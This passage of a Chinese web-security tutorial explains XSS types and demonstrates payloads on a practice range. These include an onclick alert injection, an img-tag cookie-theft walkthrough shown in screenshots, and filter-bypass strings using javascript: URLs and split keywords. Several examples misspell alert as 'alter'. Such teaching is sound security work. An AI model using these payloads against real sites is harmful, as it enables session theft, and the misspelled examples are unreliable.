0-40.311-18.047-40.311-40.31V147.302c0-22.263 18.048-40.31 40.311-40.31zM147.556 553.478H429.73c22.263 0 40.311 18.048 40.311 40.31v282.176c0 22.263-18.048 40.312-40.31 40.312H147.555c-22.263 0-40.311-18.049-40.311-40.312V593.79c0-22.263 18.048-40.311 40.31-40.311zM593.927 106.992h282.176c22.263 0 40.31 18.048 40.31 40.31V429.48c0 22.263-18.047 40.31-40.31 40.31H593.927c-22.263 0-40.311-18.047-40.311-40.31V147.302c0-22.263 18.048-40.31 40.31-40.31zM730.22 920.502H623.926c-40.925 0-74.22-33.388-74.22-74.425V623.992c0-41.038 33.387-74.424 74.425-74.424h222.085c41.038 0 74.424 33.226 74.424 74.067v114.233c0 10.244-8.304 18.548-18.547 18.548s-18.548-8.304-18.548-18.548V623.635c0-20.388-16.746-36.974-37.33-36.974H624.13c-20.585 0-37.331 16.747-37.331 37.33v222.086c0 20.585 16.654 37.331 37.126 37.331H730.22c10.243 0 18.547 8.304 18.547 18.547 0 10.244-8.304 18.547-18.547 18.547z"></path></svg><!--[--><span class="page-category-item color1 clickable" role="navigation">渗透测试</span><span class="page-category-item color8 clickable" role="navigation">外网漏洞</span><!--]--><meta property="articleSection" content="渗透测试,外网漏洞"></span><!----></div><hr></div><div class="vp-toc-placeholder"><aside id="toc" vp-toc><!----><!--[--><div class="vp-toc-header">此页内容<button type="button" class="print-button" title="打印"><svg xmlns="http://www.w3.org/2000/svg" class="icon print-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="print icon" name="print"><path d="M819.2 364.8h-44.8V128c0-17.067-14.933-32-32-32H281.6c-17.067 0-32 14.933-32 32v236.8h-44.8C145.067 364.8 96 413.867 96 473.6v192c0 59.733 49.067 108.8 108.8 108.8h44.8V896c0 17.067 14.933 32 32 32h460.8c17.067 0 32-14.933 32-32V774.4h44.8c59.733 0 108.8-49.067 108.8-108.8v-192c0-59.733-49.067-108.8-108.8-108.8zM313.6 160h396.8v204.8H313.6V160zm396.8 704H313.6V620.8h396.8V864zM864 665.6c0 25.6-19.2 44.8-44.8 44.8h-44.8V588.8c0-17.067-14.933-32-32-32H281.6c-17.067 0-32 14.933-32 32v121.6h-44.8c-25.6 0-44.8-19.2-44.8-44.8v-192c0-25.6 19.2-44.8 44.8-44.8h614.4c25.6 0 44.8 19.2 44.8 44.8v192z"></path></svg></button><div class="arrow end"></div></div><div class="vp-toc-wrapper"><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#_2-1-xss简介">2.1 XSS简介</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#_2-2-xss的分类">2.2 XSS的分类</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-2-1-反射型xss">2.2.1 反射型XSS</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-2-2-存储型xss">2.2.2 存储型XSS</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-2-3-dom-based-xss">2.2.3  DOM based xss</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#_2-3-xss漏洞进阶">2.3 XSS漏洞进阶</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-3-1-利用xss盗取cookie">2.3.1 利用XSS盗取cookie</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-3-2-绕过xss-filter">2.3.2 绕过xss-filter</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-3-3-字符编码的利用">2.3.3 字符编码的利用</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-3-4-跨站拆分法">2.3.4 跨站拆分法</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-3-5-调用shellcode">2.3.5 调用shellcode</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-3-6-session会话劫持">2.3.6 session会话劫持</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-3-7-xss网络钓鱼">2.3.7 xss网络钓鱼</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-3-8-css-javascript-history-hack">2.3.8 css/javascript history hack</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#_2-4-客户端信息刺探">2.4 客户端信息刺探</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-4-1-javascript实现端口扫描">2.4.1 javascript实现端口扫描</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-4-2-截获剪切板内容">2.4.2 截获剪切板内容</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-4-3-获取客户端ip">2.4.3 获取客户端IP</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#_2-5-xss工具利用">2.5 XSS工具利用</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-5-1-firebug">2.5.1 firebug</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-5-2-tamper-data">2.5.2 Tamper Data</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-5-3-live-http-headers">2.5.3 Live HTTP Headers</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-5-4-fiddler">2.5.4 Fiddler</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#_2-6-xss漏洞挖掘">2.6 XSS漏洞挖掘</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-6-1-黑盒工具测试">2.6.1 黑盒工具测试</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#_2-7-xss源代码审计">2.7 XSS源代码审计</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#_2-8-利用语言特性">2.8 利用语言特性</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#_2-9-xss-worm-剖析">2.9 XSS Worm 剖析</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-9-1-初步了解web-2-0">2.9.1 初步了解web 2.0</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-9-2-ajax技术">2.9.2 Ajax技术</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-9-3-http请求">2.9.3 HTTP请求</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-9-4-http响应">2.9.4 HTTP响应</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-9-5-xss-worm介绍">2.9.5  XSS Worm介绍</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-9-6-运用dom技术">2.9.6 运用dom技术</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#_2-10-flash简介">2.10 Flash简介</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-10-1-flash和swf">2.10.1 flash和swf</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-10-2-嵌入flash文件">2.10.2 嵌入flash文件</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-10-3-actionscript-语言">2.10.3 ActionScript 语言</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-10-4-flash安全模型">2.10.4 flash安全模型</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-10-5-cross-domain-policy">2.10.5 CRoss  Domain Policy</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-10-6-设置管理器">2.10.6 设置管理器</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#_2-11-flash客户端攻击剖析">2.11 Flash客户端攻击剖析</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-11-1-geturl-xss">2.11.1 getURL()&amp;XSS</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-11-2-cross-site-flashing">2.11.2 cross site flashing</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-11-3-flash参数型注入">2.11.3 Flash参数型注入</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#_2-12-利用flash-进行xss攻击剖析">2.12 利用Flash 进行XSS攻击剖析</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#_2-13-利用flash进行csrf">2.13 利用Flash进行csrf</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#_2-14-深入xss原理">2.14 深入XSS原理</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-14-1-csrf简析">2.14.1 csrf简析</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-14-2-hacking-json">2.14.2 Hacking JSON</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-14-3-http-response-splitting">2.14.3 HTTP Response Splitting</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-14-4-mhtml协议安全">2.14.4 MHTML协议安全</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-14-5-利用data-uris进行xss">2.14.5 利用Data URIs进行xss</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-14-6-utf-7-bom-xss">2.14.6 UTF-7 BOM XSS</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-14-7-浏览器插件安全">2.14.7 浏览器插件安全</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-14-8-特殊xss应用场景">2.14.8 特殊XSS应用场景</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-14-9-浏览器差异">2.14.9 浏览器差异</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-14-10-字符集编码隐患">2.14.10 字符集编码隐患</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#_2-15-防御xss">2.15 防御XSS</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-15-1-xss-filter">2.15.1 XSS Filter</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-15-2-黑名单和白名单">2.15.2 黑名单和白名单</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-15-3-字符转码">2.15.3 字符转码</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-15-4-防御dom-based-xss">2.15.4 防御dom-based-xss</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#_2-15-5-其他防御方式">2.15.5 其他防御方式</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#_2-16-防御csrf">2.16 防御CSRF</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#参考资料">参考资料</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#后记">后记</a></li><!----><!--]--></ul><div class="vp-toc-marker" style="top:-1.7rem;"></div></div><!--]--><!----></aside></div><!----><div class="theme-hope-content" vp-content><h1 id="_2-xss-跨站脚本攻击" tabindex="-1"><a class="header-anchor" href="#_2-xss-跨站脚本攻击"><span>2.XSS(跨站脚本攻击)</span></a></h1><h2 id="_2-1-xss简介" tabindex="-1"><a class="header-anchor" href="#_2-1-xss简介"><span>2.1 XSS简介</span></a></h2><p>（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是<a href="https://zh.wikipedia.org/wiki/%E4%BB%A3%E7%A2%BC%E6%B3%A8%E5%85%A5" target="_blank" rel="noopener noreferrer">代码注入</a>的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了<a href="https://zh.wikipedia.org/wiki/HTML" target="_blank" rel="noopener noreferrer">HTML</a>以及用户端<a href="https://zh.wikipedia.org/wiki/%E8%85%B3%E6%9C%AC%E8%AA%9E%E8%A8%80" target="_blank" rel="noopener noreferrer">脚本语言</a>。</p><p><strong>XSS</strong>攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是<a href="https://zh.wikipedia.org/wiki/JavaScript" target="_blank" rel="noopener noreferrer">JavaScript</a>，但实际上也可以包括<a href="https://zh.wikipedia.org/wiki/Java" target="_blank" rel="noopener noreferrer">Java</a>，<a href="https://zh.wikipedia.org/wiki/VBScript" target="_blank" rel="noopener noreferrer">VBScript</a>，<a href="https://zh.wikipedia.org/wiki/ActiveX" target="_blank" rel="noopener noreferrer">ActiveX</a>，<a href="https://zh.wikipedia.org/wiki/Flash" target="_blank" rel="noopener noreferrer">Flash</a>或者甚至是普通的<a href="https://zh.wikipedia.org/wiki/HTML" target="_blank" rel="noopener noreferrer">HTML</a>。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、<a href="https://zh.wikipedia.org/wiki/%E4%BC%9A%E8%AF%9D" target="_blank" rel="noopener noreferrer">会话</a>和<a href="https://zh.wikipedia.org/wiki/Cookie" target="_blank" rel="noopener noreferrer">cookie</a>等各种内容。</p><p>XSS是一个非常重要的漏洞，2010年统计来看，XSS已经是世界排名第二的漏洞，因此我们要给予足够的重视。</p><h2 id="_2-2-xss的分类" tabindex="-1"><a class="header-anchor" href="#_2-2-xss的分类"><span>2.2 XSS的分类</span></a></h2><p>常见的XSS我们通常可以分为三种类型，<strong>反射性</strong>，<strong>存储型</strong>，<strong>DOM based xss</strong>;接下来我们分别介绍这三种类型；</p><h3 id="_2-2-1-反射型xss" tabindex="-1"><a class="header-anchor" href="#_2-2-1-反射型xss"><span>2.2.1 反射型XSS</span></a></h3><p>反射型XSS，顾名思义，是攻击者在页面插入恶意代码，将用户输入数据“反射”给浏览器，用户点击时会执行的一种漏洞，因此，通常需要用户自行点击，也称为“非持久型XSS”；</p><h3 id="_2-2-2-存储型xss" tabindex="-1"><a class="header-anchor" href="#_2-2-2-存储型xss"><span>2.2.2 存储型XSS</span></a></h3><p>存储型XSS，相较于反射型XSS更为复杂，当存在存储型XSS时，用户输入的数据会被保存在服务器端；最简单的例子，攻击者在自己的服务器端搭建含有存储型XSS的恶意代码，并发布这篇含有恶意代码的博客，当用户查看这篇博客时，就会执行这段代码，从而丢失数据信息，这种XSS更为持久，因此也被称为“持久型XSS”；</p><h3 id="_2-2-3-dom-based-xss" tabindex="-1"><a class="header-anchor" href="#_2-2-3-dom-based-xss"><span>2.2.3 DOM based xss</span></a></h3><p>DOM型与其他类型XSS的本质区别在于，DOM型XSS不需要经过服务器端解析，而是直接解析在前端页面，这里使用pikachu靶场进行演示；</p><p><a href="https://www.w3school.com.cn/js/js_htmldom.asp" target="_blank" rel="noopener noreferrer">推荐先学习DOM是什么</a></p><div class="language-html line-numbers-mode" data-highlighter="shiki" data-ext="html" data-title="html" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">div</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> id</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;xssd_main&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">                &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">                    function</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> domxss</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(){</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">                        var</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> str</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;"> document</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getElementById</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;text&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">).</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">value</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">                        document</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getElementById</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;dom&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">).</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">innerHTML</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;&lt;a href=&#39;&quot;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">+</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">str</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">+</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;&#39;&gt;what do you see?&lt;/a&gt;&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">                    }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">                &lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">                &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">input</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> id</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;text&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> name</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;text&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> type</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;text&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">  value</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> /&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">                &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">input</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> id</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;button&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> type</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;button&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> value</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;click me!&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> onclick</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">domxss</span><span style="--shiki-light:#383A42;--shiki-dark:#98C379;">()</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> /&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">                &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">div</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> id</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;dom&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">div</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">            &lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">div</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>我们通过源码来进行分析；首先定义一个str接受id名为text的属性的值,test的值由我们来提交,将id=dom的属性的值改为:<code>&quot;&lt;a href &#39;&quot;+str+&quot;&#39;&gt;what do you see?&lt;/a&gt;&quot;</code>，标签为&quot;a&quot;;a标签的str来源于上方的获取；我们随意输入一串字符像“fumo&quot;</p><figure><img src="/articles/assets/dmoxss1-DoqsSbOh.png" alt="dmoxss1" tabindex="0" loading="lazy"><figcaption>dmoxss1</figcaption></figure><p>可以看到href被改为了fumo，当我们输入&#39; onclick=&quot;alert(&#39;fumo&#39;)&quot;&gt;时再点击what do you see 就会执行弹窗</p><figure><img src="/articles/assets/domxss2-BVc03R2S.png" alt="domxss2" tabindex="0" loading="lazy"><figcaption>domxss2</figcaption></figure><p>此时代码如图，这串代码只会在前端执行，并没有与服务器端产生任何交互。</p><figure><img src="/articles/assets/domxss3-CcpxyEd9.png" alt="domxss3" tabindex="0" loading="lazy"><figcaption>domxss3</figcaption></figure><h2 id="_2-3-xss漏洞进阶" tabindex="-1"><a class="header-anchor" href="#_2-3-xss漏洞进阶"><span>2.3 XSS漏洞进阶</span></a></h2><h3 id="_2-3-1-利用xss盗取cookie" tabindex="-1"><a class="header-anchor" href="#_2-3-1-利用xss盗取cookie"><span>2.3.1 利用XSS盗取cookie</span></a></h3><p>小tips:</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>在当前浏览器页面地址栏输入javascript:alert(document.cookie)会弹出当前页面的cookie</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>这里使用留言板进行测试；由于留言板禁用了<code>&lt;script&gt;</code>标签，我选择一个<code>&lt;img&gt;</code>标签的payload进行使用；</p><figure><img src="/articles/assets/guestbook1-DZ808qfM.png" alt="guestbook1" tabindex="0" loading="lazy"><figcaption>guestbook1</figcaption></figure><p>插入内容中，我们即可看到项目中返回的cookie;</p><figure><img src="/articles/assets/guestbook2-w0Sk0-UV.png" alt="guestbook2" tabindex="0" loading="lazy"><figcaption>guestbook2</figcaption></figure><p>接下来即可使用cookie登录后台；重新开一个浏览器，访问返回的地址，发现登陆失败，我们进行cookie的添加；再次访问返回的后台地址，成功登录，至此，我们完成了最简单的XSS盗取cookie登录后台的利用；</p><h3 id="_2-3-2-绕过xss-filter" tabindex="-1"><a class="header-anchor" href="#_2-3-2-绕过xss-filter"><span>2.3.2 绕过xss-filter</span></a></h3><p>利用漏洞的过程不总是一帆风顺的，我们会遇到很多过滤，很多禁止字符，这就需要我们利用特殊的姿势进行绕过；</p><p>(1)直接利用&lt;&gt;注射 html/js</p><p>这种情况其实非常少见，在一般情况下，&lt;&gt;都是被过滤掉的，以防止我们使用&lt;&gt;来操纵标签植入代码，如果禁用了&lt;&gt;;</p><p>很多代码就不能使用，例如：</p><p><code>&lt;script&gt;shellcode&lt;/script&gt;</code></p><p>(2)利用html标签属性值执行xss</p><p>很多html标签支持javascript:[code]伪协议的形式，我们利用这个性质控制标签属性值进行XSS，例如：</p><p><code>&lt;img src=&quot;javascript:alert(&#39;xss&#39;);&quot;&gt; </code></p><p>需要注意的是并不是所有浏览器都支持这类伪协议；</p><p>(3)利用空格，回车，tab键进行绕过</p><p>如果过滤仅仅是把敏感词拿到黑名单中检查，我们可以采用使用空格，回车和tab键的形式，例如过滤了javascript关键字：</p><p><code>&lt;img src=&quot;javas cript:alter(/xss/);&quot;&gt;</code></p><p>这里的间隔便是用tab键进行分割，同样可以执行alter(/xss/)的命令，这种拆分法可以绕过很多关键词的过滤；</p><p>出现这种状况的原因比较复杂，主要是javascript对语句的检索，当一行中有多个语句时必须使用分号，只有一句则可以省略分号；</p><div class="language-html line-numbers-mode" data-highlighter="shiki" data-ext="html" data-title="html" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">var a </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=&quot;hello world&quot;;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">alter(a);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">//javascript会查询一个完整的语句到结束，所以即便存在换行符，a同样可以赋值成功；</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">img</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> src</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;javas</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">cript:</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">alter(/xss/)&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">width</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">100</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
